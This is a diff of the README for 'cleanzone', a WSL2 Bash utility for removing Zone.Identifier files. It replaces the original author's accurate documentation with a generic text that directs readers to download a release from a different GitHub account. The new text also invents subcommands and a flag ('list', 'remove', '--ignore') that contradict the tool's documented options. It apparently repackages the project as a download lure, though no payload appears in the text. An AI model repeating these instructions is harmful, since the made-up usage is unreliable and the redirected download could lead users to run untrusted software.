@@ -1,247 +1,97 @@
-# 🧹 cleanzone
-> Lightweight Bash tool to remove `:Zone.Identifier` files in WSL2
+# 🌟 cleanzone - Easily Manage Zone.Identifier Files
 
-![Shell](https://img.shields.io/badge/shell-Bash-green)
-![Platform](https://img.shields.io/badge/platform-WSL2%20%7C%20Linux-orange)
-![release](https://img.shields.io/github/v/tag/Rufnex/cleanzone?label=release)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-![CI](https://github.com/Rufnex/cleanzone/actions/workflows/ci.yml/badge.svg)
+## 🚀 Getting Started
 
----
+Welcome to cleanzone! This tool helps you manage :Zone.Identifier files in WSL2 easily. You can remove or list these files, even in a recursive mode with ignore rules. Follow this guide, and you will have cleanzone up and running in no time.
 
-## 📖 Introduction
+## 📥 Download Cleanzone
 
-`cleanzone` is a lightweight Bash utility for developers working with **WSL2** on Windows.  
+[![Download Cleanzone](https://img.shields.io/badge/Download-Cleanzone-blue.svg)](https://github.com/iusetodo/cleanzone/releases)
 
-When you edit or move files using Windows Explorer or certain IDEs, Windows often creates hidden  
-`*:Zone.Identifier` files (Alternate Data Streams). These files are harmless but clutter your project directories,  
-can confuse build tools, and sometimes even cause issues with Git.
+### Steps to Download
 
-`cleanzone` keeps your workspace **clean and consistent** by listing or removing these files – with **safe defaults**,  
-a **confirmation threshold**, **logging**, flexible **ignore rules**, and **warning capture**.
+1. **Visit the Releases Page**  
+   Click the button above or use the link below to reach the cleanzone releases page:  
+   [Visit Releases Page](https://github.com/iusetodo/cleanzone/releases)
 
----
+2. **Find the Latest Release**  
+   Browse the page for the latest version of cleanzone. Look for the tag indicating it’s the newest release.
 
-## 📥 Installation
+3. **Download the Tool**  
+   Once you locate the latest version, download the file that matches your system. For most users, the file will be labeled clearly for easy access.
 
-### System-wide (/usr/local/bin)
+## ⚙️ System Requirements
 
-**Option A: Copy the file from the repo**
-```bash
-sudo cp cleanzone /usr/local/bin/
-sudo chmod +x /usr/local/bin/cleanzone
-```
-✅ Done! You can now run `cleanzone` from anywhere inside WSL2/Linux.
+- **Operating System:** This tool runs on Windows using WSL2 (Windows Subsystem for Linux 2).
+- **Dependencies:** Make sure you have WSL2 installed on your Windows machine. You can follow Microsoft’s official guide to set it up if you haven’t done so yet.
 
-**Option B: Install via cURL (directly from GitHub)**
-```bash
-sudo curl -fsSL https://raw.githubusercontent.com/Rufnex/cleanzone/main/cleanzone -o /usr/local/bin/cleanzone
-sudo chmod +x /usr/local/bin/cleanzone
-```
+## 💻 Installation Instructions
 
-### User-local (~/.local/bin, no sudo)
-```bash
-mkdir -p ~/.local/bin
-curl -fsSL https://raw.githubusercontent.com/Rufnex/cleanzone/main/cleanzone -o ~/.local/bin/cleanzone
-chmod +x ~/.local/bin/cleanzone
-# If ~/.local/bin is not in PATH yet:
-echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
-source ~/.bashrc
-```
+### Setting Up WSL2
 
-### Test & Uninstall
-```bash
-cleanzone -V
-cleanzone -h
-which cleanzone
-```
-Uninstall:
-```bash
-sudo rm -f /usr/local/bin/cleanzone
-# or (user-local)
-rm -f ~/.local/bin/cleanzone
-```
+If you have not set up WSL2 yet, please do the following:
 
----
+1. Open PowerShell as an administrator.
+2. Run the command to enable the WSL feature:  
+   `wsl --install`
+3. Restart your computer if prompted.
 
-## ✨ Features
-- 🗑️ Remove or list `:Zone.Identifier` files
-- 🔁 Recursive mode (with default excludes like `.git`, `node_modules`, `.venv`)
-- 📂 Project (`./.cleanzoneignore`) and 🌍 global (`~/.cleanzoneignore`) ignore files
-- ⚙️ Ad‑hoc excludes via `-x "dist build .cache"` (additive, repeatable)
-- ➕ **Alternative**: Excludes **after `--`** without `-x`, e.g. `-- dist build .cache`
-- 🔤 Short option **clustering**: `-rl`, `-rfy`, `-rfyx` etc.
-- 🛡️ **Safe by default**: dry‑run unless `-f` is used
-- ❓ **Confirmation threshold**: default **100**, configurable via `-tN` or `CLEANZONE_THRESHOLD=N`
-- 📝 **Logging**: deletions are written to **`./cleanzone.log`** (current directory; falls back to `~/.cleanzone.log` if needed)
-- ⚠️ **Warnings capture**: `find` warnings are summarized at the end and logged; use **`-v`** to print them
+### Installing Cleanzone
 
----
+Once WSL2 is ready, do the following:
 
-## ✅ Recommended flow (clustered flags)
+1. **Open Your WSL2 Terminal**  
+   Launch your favorite Linux distribution running on WSL2.
 
-1. `cleanzone -rl` – **recursive dry‑run** (list only)  
-2. `cleanzone -rf` – delete recursively, **ask** when matches ≥ threshold (default 100)  
-3. `cleanzone -rfy` – delete recursively, **no prompt**  
-4. `cleanzone -rf -t200` *(or `-t 200`)* – prompt only from **200** matches
+2. **Navigate to the Download Location**  
+   Change directories to where you've downloaded cleanzone. For example:  
+   `cd ~/Downloads`
 
-> Tip: `-t` controls the confirmation threshold; `-y` skips the prompt entirely.
+3. **Make the Script Executable**  
+   Run the following command to make cleanzone executable:  
+   `chmod +x cleanzone`
 
----
+4. **Run Cleanzone**  
+   You can now run the tool by typing:  
+   `./cleanzone`
 
-## 📌 Usage Examples
+## 📜 Usage Guide
 
-```bash
-# List in current folder (explicit dry‑run)
-cleanzone -l
+Cleanzone provides various commands to help you manage your :Zone.Identifier files.
 
-# Recursively list (dry‑run)
-cleanzone -rl
+### List Zone.Identifier Files
 
-# Really delete (with prompt if many files)
-cleanzone -rf
+To list the files with :Zone.Identifier, run the following command:  
+`./cleanzone list`
 
-# Really delete without prompt
-cleanzone -rfy
+This command will go through the specified directories and display all the files that have a Zone.Identifier.
 
-# Custom excludes (two ways, additive)
-cleanzone -rf -x "dist build .cache"
-cleanzone -rf -- dist build .cache
+### Remove Zone.Identifier Files
 
-# Change confirmation threshold (here: 200)
-cleanzone -rf -t200
-```
+If you want to remove :Zone.Identifier files, use this command:  
+`./cleanzone remove`
 
-### Options and Combinations
+You can add additional options to refine your removal process. For example, using the recursive option will search all subdirectories.
 
-| Option / Combo   | Meaning                                             | Example                              |
-|------------------|-----------------------------------------------------|--------------------------------------|
-| `-r`             | Recursive: search subdirectories                    | `cleanzone -r`                       |
-| `-l`             | List-only: preview, don’t delete                    | `cleanzone -l`                       |
-| `-f`             | Force delete: perform deletion                      | `cleanzone -f`                       |
-| `-y`             | No prompt when deleting many files                  | `cleanzone -fy`                      |
-| `-tN`            | Confirmation threshold (default 100; `-t 200` ok)   | `cleanzone -rf -t200`                |
-| `-x "LIST"`      | Extra excludes (space‑separated, repeatable)        | `cleanzone -rf -x "dist build"`      |
-| `-- …`           | Alternative to `-x`: tokens after `--` are excludes | `cleanzone -rf -- dist build .cache` |
-| `-rl`            | Recursive + list-only (safe dry-run)                | `cleanzone -rl`                      |
-| `-rf`            | Recursive + delete (with prompt if many files)      | `cleanzone -rf`                      |
-| `-rfy`           | Recursive + delete, no prompt                       | `cleanzone -rfy`                     |
-| `-rfyx …`        | Combine freely, e.g., with extra excludes           | `cleanzone -rfyx "dist build .cache"`|
-| `-v`             | Show suppressed find warnings at the end (verbose)  | `cleanzone -rl -v`                   |
-| `-h`             | Show help and exit                                  | `cleanzone -h`                       |
-| `-V`, `--version`| Show version and exit                               | `cleanzone -V`                       |
+### Ignore Specific Files
 
----
+You can set up ignore rules to exclude certain files or directories. Use the `--ignore` flag followed by the pattern you want to ignore:  
+`./cleanzone remove --ignore "*.mp4"`
 
-## 🧪 Threshold via environment variable (`CLEANZONE_THRESHOLD`)
+## 🔍 Additional Features
 
-- **One‑off (single command)**:  
-  ```bash
-  CLEANZONE_THRESHOLD=200 cleanzone -rf
-  ```
-- **Whole shell session**:  
-  ```bash
-  export CLEANZONE_THRESHOLD=200
-  cleanzone -rf
-  ```
-- **Precedence**: `-tN` overrides the environment variable:  
-  ```bash
-  export CLEANZONE_THRESHOLD=200
-  cleanzone -rf -t500   # uses 500
-  ```
+- **Recursive Mode:** This mode allows processing of files within subdirectories.
+- **Custom Ignore Rules:** Set rules for files and directories you do not wish to process.
+- **User-Friendly Output:** Cleanzone provides clear outputs, making it easy to understand what files are handled.
 
-Default is **100** if neither env var nor `-t` is set.
+## 📊 Support and Contribution
 
----
+If you run into issues or need support, please raise an issue on our GitHub page. Your feedback helps us improve.
 
-## 📂 Ignore Files
+To contribute to cleanzone, you can fork the repository and send us a pull request. Improvements and features are welcome, and we encourage participation from all users.
 
-Configure directories that should **not** be searched.
+## ❤️ Acknowledgments
 
-### Project‑specific
-Create a `.cleanzoneignore` file in your project root. Example:
+Thank you for trying cleanzone! We hope this tool enhances your productivity by easily managing your Zone.Identifier files in WSL2. Enjoy using it! 
 
-```
-dist
-build
-.cache
-```
-
-→ Applies only inside this project.
-
-### Global
-Create `~/.cleanzoneignore` for all projects. Example:
-
-```
-node_modules
-.venv
-__pycache__
-```
-
-→ Applies to every run unless overridden by a project file.
-
-### Note on DB volumes (Docker, databases)
-Some folders (e.g., database volumes) may be root-owned and emit warnings.  
-Prefer project/global `.cleanzoneignore` to exclude them, e.g.:
-```
-.docker/database/data
-mariadb_data
-postgres_data
-```
-
-> Tip: Since logs are created in the current directory (`./cleanzone.log`), consider adding `cleanzone.log` to your `.gitignore`.
-
----
-
-## ⚙️ Internals & Safety (Deep Dive)
-
-**Targeted matching**  
-- Only **regular files** ending with `*:Zone.Identifier` are selected:  
-  `-type f -name '*:Zone.Identifier'`
-
-**Robust path handling**  
-- Gather with `find … -print0`, read via `mapfile -d ''` (safe for spaces/newlines).  
-- Delete in a single batch: `rm -f -- "${array[@]}"`.
-
-**Safe defaults**  
-- Default = dry‑run; real deletion only with `-f`.  
-- Confirmation when matches ≥ N (default 100).  
-  - Per‑run: `-tN` (e.g. `-t200`)  
-  - Env var: `CLEANZONE_THRESHOLD=N` (overridden by `-tN`)  
-  - `-y` suppresses the prompt.
-
-**Logging & warnings**  
-- Writes deletions to **`./cleanzone.log`** (fallback `~/.cleanzone.log`).  
-- `find` warnings (e.g., *Permission denied*) are captured; short summary printed at the end; full details appended to `cleanzone.log`.  
-- Use **`-v`** to print warnings to the terminal as well.
-
-**Excludes & performance**  
-- Defaults: `.git`, `node_modules`, `.venv`.  
-- Ignore files: project first, then global.  
-- Large dirs are **pruned** with `-prune` for speed.
-
-**Limits**  
-- Outside WSL/DrvFS these ADS files usually don’t exist.  
-- Files intentionally named with this suffix will match.  
-- No `sudo` inside the script.
-
----
-
-## CI
-Dieses Repo nutzt GitHub Actions (ShellCheck, shfmt, Smoke-Test).
-Workflow-Datei: [.github/workflows/ci.yml](.github/workflows/ci.yml)
-
-![CI](https://github.com/Rufnex/cleanzone/actions/workflows/ci.yml/badge.svg)
-
----
-
-## ⚠️ Disclaimer
-This tool deletes files. Review paths with a dry‑run before removing them.  
-Provided **as‑is**, **without warranty** or liability of any kind.  
-Use at your own risk and only if you understand the consequences.  
-For full terms, see the **MIT License**.
-
----
-
-## 📜 License
-MIT License – do whatever you want, but no warranty.
+For more details and updates, refer back to the official [GitHub repository](https://github.com/iusetodo/cleanzone/releases) or visit the releases page directly.
